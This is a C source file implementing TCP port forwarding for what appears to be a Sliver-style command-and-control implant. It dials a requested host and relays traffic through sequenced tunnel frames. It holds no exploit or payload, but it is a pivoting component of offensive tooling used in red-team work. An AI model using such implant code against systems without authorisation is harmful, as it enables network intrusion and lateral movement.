/* src/modes/portfwd.c - in-band TCP port forwarding over a tunnel.
 *
 * Client sends PortfwdReq{Host,Port,TunnelID}; we dial the target and relay
 * bytes both ways: socket -> TunnelData{Sequence} frames, and inbound
 * TunnelData -> socket.
 */
#include "sliver/rpc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"

#define SLIVER_MAX_PORTFWDS 8
#define SLIVER_PORTFWD_CHUNK 8192
#define SLIVER_PORTFWD_POLL_MS 200

typedef struct {
  uint64_t id;
  int used;
  sliver_socket_t *sock;
  uint64_t sequence;
  uint64_t read_sequence;
  volatile int stop;
  sliver_mutex_t *lock;
} portfwd_t;

typedef int (*sliver_portfwd_send_fn)(uint32_t type, const void *data, size_t len);

static portfwd_t g_forwards[SLIVER_MAX_PORTFWDS];
static sliver_portfwd_send_fn g_send = NULL;

void sliver_portfwd_set_sender(sliver_portfwd_send_fn fn) { g_send = fn; }

static portfwd_t *forward_find(uint64_t id) {
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    if (g_forwards[i].used && g_forwards[i].id == id) {
      return &g_forwards[i];
    }
  }
  return NULL;
}

static void forward_release(portfwd_t *f) {
  if (f == NULL || !f->used) {
    return;
  }
  f->stop = 1;
  if (f->sock != NULL) {
    /* Closing the socket unblocks the relay thread's recv. */
    sliver_socket_close(f->sock);
    f->sock = NULL;
  }
  if (f->lock != NULL) {
    sliver_mutex_destroy(f->lock);
  }
  memset(f, 0, sizeof(*f));
}

void sliver_portfwd_shutdown(void) {
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    forward_release(&g_forwards[i]);
  }
}

static int forward_send_data(portfwd_t *f, const void *data, size_t len, int closed) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  if (f->lock != NULL) {
    sliver_mutex_lock(f->lock);
  }
  rc = sliver_tunnel_data_encode(&msg, data, len, closed, f->sequence, f->id, 0);
  if (rc == 0) {
    rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
    if (rc == 0) {
      f->sequence++;
    }
  }
  if (f->lock != NULL) {
    sliver_mutex_unlock(f->lock);
  }
  sliver_buf_free(&msg);
  return rc;
}

static void forward_ack(portfwd_t *f) {
  sliver_buf_t msg;
  if (g_send == NULL) {
    return;
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, f->sequence, f->id, f->read_sequence) == 0) {
    (void)g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  }
  sliver_buf_free(&msg);
}

static void forward_thread(void *arg) {
  portfwd_t *f = (portfwd_t *)arg;
  char buf[SLIVER_PORTFWD_CHUNK];

  while (!f->stop) {
    long n = sliver_socket_recv(f->sock, buf, sizeof(buf));
    if (n == 0) {
      break;
    }
    if (n < 0) {
      if (!f->stop) {
        continue; /* receive timeout: poll the stop flag */
      }
      break;
    }
    LOG_DEBUG("portfwd: socket->tunnel %ld bytes", n);
    if (forward_send_data(f, buf, (size_t)n, 0) != 0) {
      LOG_WARN("portfwd: tunnel send failed, closing");
      break;
    }
  }
  LOG_INFO("portfwd: closing tunnel=%llu (socket EOF)", (unsigned long long)f->id);
  (void)forward_send_data(f, NULL, 0, 1);
}

/* The client creates the tunnel server-side and binds it by sending a zero byte
 * TunnelData before the PortfwdReq arrives. We must acknowledge that frame, or
 * the client waits for "bound" until it times out. */
int sliver_portfwd_bind(uint64_t id) {
  portfwd_t *f;

  if (forward_find(id) != NULL) {
    return 1;
  }
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    if (!g_forwards[i].used) {
      f = &g_forwards[i];
      memset(f, 0, sizeof(*f));
      f->used = 1;
      f->id = id;
      f->lock = sliver_mutex_create();
      forward_ack(f);
      return 1;
    }
  }
  return 0;
}

int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  char host[512];
  uint32_t port = 0;
  uint64_t tunnel_id = 0;
  sliver_socket_t *sock;
  portfwd_t *f = NULL;
  uint64_t id;
  int rc;

  host[0] = '\0';
  sliver_reader_init(&r, req->data, req->data_len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 3 && wire == 2) {
      if (sliver_reader_string(&r, host, sizeof(host)) != 0) {
        return -1;
      }
    } else if (field == 1 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      port = (uint32_t)v;
    } else if (field == 8 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      tunnel_id = v;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  if (host[0] == '\0' || port == 0) {
    return -1;
  }
  sock = sliver_tcp_connect(host, (uint16_t)port);
  if (sock == NULL) {
    char errmsg[256];
    LOG_WARN("portfwd: cannot connect %s:%u", host, (unsigned)port);
    /* Answer with a proper error, otherwise the client shows a healthy forward
     * and every connection just hangs. */
    (void)snprintf(errmsg, sizeof(errmsg), "portfwd: cannot connect %s:%u", host, (unsigned)port);
    if (sliver_buf_put_string(out, 3, host) != 0 || sliver_buf_put_uint32(out, 1, port) != 0 ||
        sliver_buf_put_uint64(out, 8, tunnel_id) != 0) {
      return -1;
    }
    {
      sliver_buf_t resp;
      int ok;
      sliver_buf_init(&resp);
      if (sliver_buf_put_string(&resp, 1, errmsg) != 0) {
        sliver_buf_free(&resp);
        return -1;
      }
      ok = sliver_buf_put_bytes(out, 9, resp.data, resp.len);
      sliver_buf_free(&resp);
      return ok;
    }
  }
  sliver_socket_set_recv_timeout(sock, SLIVER_PORTFWD_POLL_MS);
  id = tunnel_id;
  f = forward_find(id);
  if (f != NULL) {
    /* Bound earlier by the client bind frame: attach the socket. */
    f->sock = sock;
    if (f->lock == NULL) {
      f->lock = sliver_mutex_create();
    }
    if (sliver_thread_create(forward_thread, f) == NULL) {
      forward_release(f);
      return -1;
    }
    goto respond;
  }
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    if (!g_forwards[i].used) {
      f = &g_forwards[i];
      break;
    }
  }
  if (f == NULL) {
    sliver_socket_close(sock);
    return -1;
  }
  memset(f, 0, sizeof(*f));
  f->used = 1;
  f->id = id;
  f->sock = sock;
  f->lock = sliver_mutex_create();
  LOG_INFO("portfwd: connected %s:%u tunnel=%llu", host, (unsigned)port,
           (unsigned long long)id);
  if (sliver_thread_create(forward_thread, f) == NULL) {
    forward_release(f);
    return -1;
  }
respond:
  /* Portfwd{Host=3, Port=1, TunnelID=8, Response=9}. */
  if (sliver_buf_put_string(out, 3, host) != 0 || sliver_buf_put_uint32(out, 1, port) != 0 ||
      sliver_buf_put_uint64(out, 8, id) != 0) {
    return -1;
  }
  return sliver_buf_put_tag(out, 9, 2) == 0 && sliver_buf_put_varint(out, 0) == 0 ? 0 : -1;
}

/* Returns 1 when the tunnel id belonged to a port forward. */
int sliver_portfwd_tunnel_data(const sliver_tunnel_data_t *td) {
  portfwd_t *f = forward_find(td->tunnel_id);
  if (f == NULL) {
    return 0;
  }
  if (td->ack != 0 && td->data_len == 0 && !td->closed) {
    return 1;
  }
  if (f->sock == NULL) {
    /* The forward was never established (dial failed): tell the peer to close
     * instead of letting its connection hang. */
    LOG_WARN("portfwd: tunnel=%llu has no socket, closing", (unsigned long long)f->id);
    (void)forward_send_data(f, NULL, 0, 1);
    forward_release(f);
    return 1;
  }
  if (td->sequence == f->read_sequence) {
    if (td->data_len != 0) {
      LOG_DEBUG("portfwd: tunnel->socket %u bytes", (unsigned)td->data_len);
      (void)sliver_socket_send(f->sock, td->data, td->data_len);
    }
    if (td->closed) {
      forward_release(f);
      return 1;
    }
    f->read_sequence++;
  }
  forward_ack(f);
  return 1;
}

int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
  portfwd_t *f = forward_find(tunnel_id);
  if (f == NULL) {
    return 0;
  }
  forward_release(f);
  return 1;
}





